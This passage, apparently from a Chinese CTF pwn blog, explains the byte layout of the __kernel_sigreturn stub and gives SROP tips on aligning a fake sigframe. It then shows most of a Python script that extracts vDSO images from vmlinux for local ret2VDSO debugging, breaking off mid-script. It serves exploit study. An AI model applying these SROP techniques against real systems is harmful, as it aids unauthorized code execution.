<li><code>eax = 0x77</code> → 系统调用号 &#x3D; <code>sys_sigreturn</code></li>
<li><code>esp = &amp;sigcontext</code> → 内核按照这个地址把寄存器现场恢复。</li>
</ul>
<h3 id="4-为啥不用-add-esp-4，非要-pop-eax？"><a href="#4-为啥不用-add-esp-4，非要-pop-eax？" class="headerlink" title="4. 为啥不用 add esp, 4，非要 pop eax？"></a>4. 为啥不用 <code>add esp, 4</code>，非要 <code>pop eax</code>？</h3><p>还有一个历史&#x2F;实现上的小细节：</p>
<ul>
<li><p>早期的 signal frame 里有一个 <code>char retcode[8];</code>，内核&#x2F;库会在这里塞一段固定的“返回代码”。</p>
</li>
<li><p>这段代码刚好是 8 个字节：</p>
<div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pop</span>   <span class="built_in">eax</span>            <span class="comment">; 1 字节  (0x58)</span></span><br><span class="line"><span class="keyword">mov</span>   <span class="built_in">eax</span>, <span class="number">0x77</span>      <span class="comment">; 5 字节  (0xB8 77 00 00 00)</span></span><br><span class="line"><span class="keyword">int</span>   <span class="number">0x80</span>           <span class="comment">; 2 字节  (0xCD 80)</span></span><br></pre></td></tr></table></figure></div>

<p>总共 1 + 5 + 2 &#x3D; 8 字节，刚好塞满 <code>retcode[8]</code>。</p>
</li>
<li><p>如果用 <code>add esp, 4</code>（<code>83 C4 04</code>，3 字节），整个 stub 会变成 3 + 5 + 2 &#x3D; 10 字节，就塞不进这个 8 字节的 slot 里了。</p>
</li>
</ul>
<p>所以 <code>pop eax</code> 是一个<strong>又省空间又符合 ABI</strong>的实现方式。</p>
<h3 id="5-和-SROP-利用相关"><a href="#5-和-SROP-利用相关" class="headerlink" title="5. 和 SROP 利用相关"></a>5. 和 SROP 利用相关</h3><p>你后面如果玩 SROP 利用这个 <code>__kernel_sigreturn</code>，这个 <code>pop eax</code> 也很关键：</p>
<ul>
<li>如果你 ROP 跳到 <code>__kernel_sigreturn</code> 的<strong>开头</strong>（带 <code>pop eax</code>），那你在它后面布 fake sigframe 时，必须在前面先放 4 个垃圾字节给它 <code>pop</code> 掉，否则你的 <code>sigcontext</code> 会整体错位 4 字节。</li>
<li>很多利用直接跳 <code>__kernel_sigreturn + 1</code>，也就是从 <code>mov eax,0x77</code> 开始，这样**跳过了 <code>pop</code>**，就可以让 fake sigframe 紧跟在返回地址后面，不用考虑对齐的问题。</li>
</ul>
</blockquote>
<h2 id="本地更换-VDSO"><a href="#本地更换-VDSO" class="headerlink" title="本地更换 VDSO"></a>本地更换 VDSO</h2><p>通常涉及到 ret2VDSO 的题目会提供一个完整的内核 pwn 环境，我们需要将内核镜像中的 VDSO 替换到本地的调试环境中，这样方便我们在本地调试。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Extract vDSO images (32-bit / 64-bit / x32) from a Linux vmlinux ELF.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Usage:</span></span><br><span class="line"><span class="comment">#   python3 extract_vdso.py vmlinux [out_dir]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Example:</span></span><br><span class="line"><span class="comment">#   python3 extract_vdso.py ./vmlinux</span></span><br><span class="line"><span class="comment">#   python3 extract_vdso.py ./vmlinux ./out</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 本脚本会自动：</span></span><br><span class="line"><span class="comment">#   - 检测 vmlinux 是 ELF32 还是 ELF64</span></span><br><span class="line"><span class="comment">#   - 从符号表里查找 vdso_image_* 符号</span></span><br><span class="line"><span class="comment">#   - 利用 struct vdso_image &#123; void *data; unsigned long size; ... &#125;</span></span><br><span class="line"><span class="comment">#     的前两个字段提取真正的 vDSO 镜像</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 注意：提取的是 vmlinux 里的“构建时” vDSO 镜像，</span></span><br><span class="line"><span class="comment">#       实际运行时映射到进程中的 vDSO 可能经过内核 patch/alternatives，</span></span><br><span class="line"><span class="comment">#       因此和调试看到的 vDSO 有差异是正常的。</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">PT_LOAD    = <span class="number">1</span></span><br><span class="line">SHT_SYMTAB = <span class="number">2</span></span><br><span class="line">SHT_DYNSYM = <span class="number">11</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fatal</span>(<span class="params">msg</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] &quot;</span> + msg, file=sys.stderr)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_elf_header</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) &lt; <span class="number">0x34</span>:</span><br><span class="line">        fatal(<span class="string">&quot;File too small to be a valid ELF&quot;</span>)</span><br><span class="line"></span><br><span class="line">    e_ident = data[:<span class="number">16</span>]</span><br><span class="line">    <span class="keyword">if</span> e_ident[:<span class="number">4</span>] != <span class="string">b&quot;\x7fELF&quot;</span>:</span><br><span class="line">        fatal(<span class="string">&quot;Not an ELF file&quot;</span>)</span><br><span class="line"></span><br><span class="line">    ei_class = e_ident[<span class="number">4</span>]  <span class="comment"># 1=ELF32, 2=ELF64</span></span><br><span class="line">    ei_data  = e_ident[<span class="number">5</span>]  <span class="comment"># 1=little, 2=big</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ei_data == <span class="number">1</span>:</span><br><span class="line">        endian = <span class="string">&quot;&lt;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> ei_data == <span class="number">2</span>:</span><br><span class="line">        endian = <span class="string">&quot;&gt;&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        fatal(<span class="string">&quot;Unsupported ELF data encoding (ei_data=%d)&quot;</span> % ei_data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ei_class == <span class="number">1</span>:</span><br><span class="line">        <span class="comment"># ELF32 header</span></span><br><span class="line">        ELF_HDR_FMT = endian + <span class="string">&quot;16sHHIIIIIHHHHHH&quot;</span></span><br><span class="line">        (e_ident,</span><br><span class="line">         e_type, e_machine, e_version,</span><br><span class="line">         e_entry, e_phoff, e_shoff, e_flags,</span><br><span class="line">         e_ehsize, e_phentsize, e_phnum,</span><br><span class="line">         e_shentsize, e_shnum, e_shstrndx) = struct.unpack_from(ELF_HDR_FMT, data, <span class="number">0</span>)</span><br><span class="line">        is_64 = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">elif</span> ei_class == <span class="number">2</span>:</span><br><span class="line">        <span class="comment"># ELF64 header</span></span><br><span class="line">        ELF_HDR_FMT = endian + <span class="string">&quot;16sHHIQQQIHHHHHH&quot;</span></span><br><span class="line">        (e_ident,</span><br><span class="line">         e_type, e_machine, e_version,</span><br><span class="line">         e_entry, e_phoff, e_shoff, e_flags,</span><br><span class="line">         e_ehsize, e_phentsize, e_phnum,</span><br><span class="line">         e_shentsize, e_shnum, e_shstrndx) = struct.unpack_from(ELF_HDR_FMT, data, <span class="number">0</span>)</span><br><span class="line">        is_64 = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        fatal(<span class="string">&quot;Unsupported ELF class (ei_class=%d)&quot;</span> % ei_class)</span><br><span class="line"></span><br><span class="line">    hdr = &#123;</span><br><span class="line">        <span class="string">&quot;endian&quot;</span>: endian,</span><br><span class="line">        <span class="string">&quot;is_64&quot;</span>: is_64,</span><br><span class="line">        <span class="string">&quot;e_type&quot;</span>: e_type,</span><br><span class="line">        <span class="string">&quot;e_machine&quot;</span>: e_machine,</span><br><span class="line">        <span class="string">&quot;e_version&quot;</span>: e_version,</span><br><span class="line">        <span class="string">&quot;e_entry&quot;</span>: e_entry,</span><br><span class="line">        <span class="string">&quot;e_phoff&quot;</span>: e_phoff,</span><br><span class="line">        <span class="string">&quot;e_shoff&quot;</span>: e_shoff,</span><br><span class="line">        <span class="string">&quot;e_flags&quot;</span>: e_flags,</span><br><span class="line">        <span class="string">&quot;e_ehsize&quot;</span>: e_ehsize,</span><br><span class="line">        <span class="string">&quot;e_phentsize&quot;</span>: e_phentsize,</span><br><span class="line">        <span class="string">&quot;e_phnum&quot;</span>: e_phnum,</span><br><span class="line">        <span class="string">&quot;e_shentsize&quot;</span>: e_shentsize,</span><br><span class="line">        <span class="string">&quot;e_shnum&quot;</span>: e_shnum,</span><br><span class="line">        <span class="string">&quot;e_shstrndx&quot;</span>: e_shstrndx,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hdr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_program_headers</span>(<span class="params">data, hdr</span>):</span><br><span class="line">    phdrs = []</span><br><span class="line">    endian      = hdr[<span class="string">&quot;endian&quot;</span>]</span><br><span class="line">    e_phoff     = hdr[<span class="string">&quot;e_phoff&quot;</span>]</span><br><span class="line">    e_phnum     = hdr[<span class="string">&quot;e_phnum&quot;</span>]</span><br><span class="line">    e_phentsize = hdr[<span class="string">&quot;e_phentsize&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> hdr[<span class="string">&quot;is_64&quot;</span>]:</span><br><span class="line">        <span class="comment"># ELF64: p_type, p_flags, p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_align</span></span><br><span class="line">        PHDR_FMT = endian + <span class="string">&quot;IIQQQQQQ&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># ELF32: p_type, p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_flags, p_align</span></span><br><span class="line">        PHDR_FMT = endian + <span class="string">&quot;IIIIIIII&quot;</span></span><br><span class="line"></span><br><span class="line">    expected_size = struct.calcsize(PHDR_FMT)</span><br><span class="line">    <span class="keyword">if</span> e_phentsize &lt; expected_size:</span><br><span class="line">        fatal(<span class="string">&quot;Program header entry size (%d) smaller than expected (%d)&quot;</span> %</span><br><span class="line">              (e_phentsize, expected_size))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(e_phnum):</span><br><span class="line">        off = e_phoff + i * e_phentsize</span><br><span class="line">        fields = struct.unpack_from(PHDR_FMT, data, off)</span><br><span class="line">        <span class="keyword">if</span> hdr[<span class="string">&quot;is_64&quot;</span>]:</span><br><span class="line">            p_type, p_flags, p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_align = fields</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p_type, p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_flags, p_align = fields</span><br><span class="line"></span><br><span class="line">        phdrs.append((p_type, p_offset, p_vaddr, p_memsz))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phdrs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_section_headers</span>(<span class="params">data, hdr</span>):</span><br><span class="line">    sections = []</span><br><span class="line">    endian      = hdr[<span class="string">&quot;endian&quot;</span>]</span><br><span class="line">    e_shoff     = hdr[<span class="string">&quot;e_shoff&quot;</span>]</span><br><span class="line">    e_shnum     = hdr[<span class="string">&quot;e_shnum&quot;</span>]</span><br><span class="line">    e_shentsize = hdr[<span class="string">&quot;e_shentsize&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> hdr[<span class="string">&quot;is_64&quot;</span>]:</span><br><span class="line">        <span class="comment"># ELF64 section header</span></span><br><span class="line">        SHDR_FMT = endian + <span class="string">&quot;IIQQQQIIQQ&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># ELF32 section header</span></span><br><span class="line">        SHDR_FMT = endian + <span class="string">&quot;IIIIIIIIII&quot;</span></span><br><span class="line"></span><br><span class="line">    expected_size = struct.calcsize(SHDR_FMT)</span><br><span class="line">    <span class="keyword">if</span> e_shentsize &lt; expected_size:</span><br><span class="line">        fatal(<span class="string">&quot;Section header entry size (%d) smaller than expected (%d)&quot;</span> %</span><br><span class="line">              (e_shentsize, expected_size))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(e_shnum):</span><br><span class="line">        off = e_shoff + i * e_shentsize</span><br><span class="line">        (sh_name, sh_type, sh_flags, sh_addr, sh_offset,</span><br><span class="line">         sh_size, sh_link, sh_info, sh_addralign, sh_entsize) = struct.unpack_from(</span><br><span class="line">            SHDR_FMT, data, off</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        sections.append(&#123;</span><br><span class="line">            <span class="string">&quot;name_off&quot;</span>: sh_name,   <span class="comment"># 我们这里用不到 section 名称本身</span></span><br><span class="line">            <span class="string">&quot;type&quot;</span>: sh_type,</span><br><span class="line">            <span class="string">&quot;flags&quot;</span>: sh_flags,</span><br><span class="line">            <span class="string">&quot;addr&quot;</span>: sh_addr,</span><br><span class="line">            <span class="string">&quot;offset&quot;</span>: sh_offset,</span><br><span class="line">            <span class="string">&quot;size&quot;</span>: sh_size,</span><br><span class="line">            <span class="string">&quot;link&quot;</span>: sh_link,</span><br><span class="line">            <span class="string">&quot;info&quot;</span>: sh_info,</span><br><span class="line">            <span class="string">&quot;addralign&quot;</span>: sh_addralign,</span><br><span class="line">            <span class="string">&quot;entsize&quot;</span>: sh_entsize,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sections</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_vaddr_to_offset</span>(<span class="params">phdrs</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">vaddr_to_offset</span>(<span class="params">vaddr, size</span>):</span><br><span class="line">        <span class="keyword">for</span> p_type, p_offset, p_vaddr, p_memsz <span class="keyword">in</span> phdrs:</span><br><span class="line">            <span class="keyword">if</span> p_type != PT_LOAD:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> vaddr &gt;= p_vaddr <span class="keyword">and</span> vaddr + size &lt;= p_vaddr + p_memsz:</span><br><span class="line">                <span class="keyword">return</span> p_offset + (vaddr - p_vaddr)</span><br><span class="line">        fatal(</span><br><span class="line">            <span class="string">&quot;vaddr %#x (size %#x) not found in any PT_LOAD segment&quot;</span> %</span><br><span class="line">            (vaddr, size)</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">return</span> vaddr_to_offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_c_string</span>(<span class="params">blob, offset</span>):</span><br><span class="line">    end = blob.find(<span class="string">b&quot;\x00&quot;</span>, offset)</span><br><span class="line">    <span class="keyword">if</span> end == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> blob[offset:].decode(<span class="string">&quot;ascii&quot;</span>, <span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> blob[offset:end].decode(<span class="string">&quot;ascii&quot;</span>, <span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_symbol_values</span>(<span class="params">data, hdr, sections</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    解析所有 SHT_SYMTAB / SHT_DYNSYM，返回</span></span><br><span class="line"><span class="string">    &#123; symbol_name: st_value &#125; 的字典。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    syms   = &#123;&#125;</span><br><span class="line">    endian = hdr[<span class="string">&quot;endian&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> hdr[<span class="string">&quot;is_64&quot;</span>]:</span><br><span class="line">        <span class="comment"># Elf64_Sym: st_name, st_info, st_other, st_shndx, st_value, st_size</span></span><br><span class="line">        SYM_FMT = endian + <span class="string">&quot;IBBHQQ&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># Elf32_Sym: st_name, st_value, st_size, st_info, st_other, st_shndx</span></span><br><span class="line">        SYM_FMT = endian + <span class="string">&quot;IIIBBH&quot;</span></span><br><span class="line"></span><br><span class="line">    sym_fmt_size = struct.calcsize(SYM_FMT)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> sh <span class="keyword">in</span> sections:</span><br><span class="line">        <span class="keyword">if</span> sh[<span class="string">&quot;type&quot;</span>] <span class="keyword">not</span> <span class="keyword">in</span> (SHT_SYMTAB, SHT_DYNSYM):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        strtab_index = sh[<span class="string">&quot;link&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt;= strtab_index &lt; <span class="built_in">len</span>(sections)):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        str_sh   = sections[strtab_index]</span><br><span class="line">        str_off  = str_sh[<span class="string">&quot;offset&quot;</span>]</span><br><span class="line">        str_size = str_sh[<span class="string">&quot;size&quot;</span>]</span><br><span class="line">        strtab   = data[str_off:str_off + str_size]</span><br><span class="line"></span><br><span class="line">        entsize = sh[<span class="string">&quot;entsize&quot;</span>] <span class="keyword">or</span> sym_fmt_size</span><br><span class="line">        <span class="keyword">if</span> entsize &lt; sym_fmt_size:</span><br><span class="line">            fatal(<span class="string">&quot;Symbol entry size (%d) smaller than expected (%d)&quot;</span> %</span><br><span class="line">                  (entsize, sym_fmt_size))</span><br><span class="line"></span><br><span class="line">        num     = sh[<span class="string">&quot;size&quot;</span>] // entsize</span><br><span class="line">        sym_off = sh[<span class="string">&quot;offset&quot;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">            off = sym_off + i * entsize</span><br><span class="line">            <span class="keyword">if</span> hdr[<span class="string">&quot;is_64&quot;</span>]:</span><br><span class="line">                st_name, st_info, st_other, st_shndx, st_value, st_size = struct.unpack_from(</span><br><span class="line">                    SYM_FMT, data, off</span><br><span class="line">                )</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                st_name, st_value, st_size, st_info, st_other, st_shndx = struct.unpack_from(</span><br><span class="line">                    SYM_FMT, data, off</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> st_name == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            name = get_c_string(strtab, st_name)</span><br><span class="line">            <span class="comment"># 只记录第一次出现的同名符号即可</span></span><br><span class="line">            <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> syms:</span><br><span class="line">                syms[name] = st_value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> syms</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_vdso_for_symbol</span>(<span class="params">data, hdr, vaddr_to_offset,</span></span><br><span class="line"><span class="params">                            sym_name, sym_vaddr, label, out_dir</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    根据 vdso_image_* 符号提取对应 vDSO 镜像：</span></span><br><span class="line"><span class="string">      struct vdso_image &#123; void *data; unsigned long size; ... &#125;</span></span><br><span class="line"><span class="string">    只用前两个字段。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    ptr_fmt   = <span class="string">&quot;Q&quot;</span> <span class="keyword">if</span> hdr[<span class="string">&quot;is_64&quot;</span>] <span class="keyword">else</span> <span class="string">&quot;I&quot;</span></span><br><span class="line">    ulong_fmt = ptr_fmt      <span class="comment"># 内核里 unsigned long 与指针同宽</span></span><br><span class="line">    vdso_hdr_fmt  = hdr[<span class="string">&quot;endian&quot;</span>] + ptr_fmt + ulong_fmt</span><br><span class="line">    vdso_hdr_size = struct.calcsize(vdso_hdr_fmt)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1) 取出 struct vdso_image 前两个字段</span></span><br><span class="line">    img_off = vaddr_to_offset(sym_vaddr, vdso_hdr_size)</span><br><span class="line">    data_vaddr, img_size = struct.unpack_from(vdso_hdr_fmt, data, img_off)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] %s: struct @ %#x, data = %#x, size = %#x&quot;</span> %</span><br><span class="line">          (sym_name, sym_vaddr, data_vaddr, img_size))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2) 把 data 指向的 vDSO 镜像拷出来</span></span><br><span class="line">    text_off = vaddr_to_offset(data_vaddr, img_size)</span><br><span class="line">    vdso_bytes = data[text_off:text_off + img_size]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(vdso_bytes) != img_size:</span><br><span class="line">        fatal(<span class="string">&quot;Short read for %s: expected %#x bytes, got %#x&quot;</span> %</span><br><span class="line">              (sym_name, img_size, <span class="built_in">len</span>(vdso_bytes)))</span><br><span class="line"></span><br><span class="line">    out_path = os.path.join(out_dir, <span class="string">&quot;%s.bin&quot;</span> % label)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(out_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(vdso_bytes)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 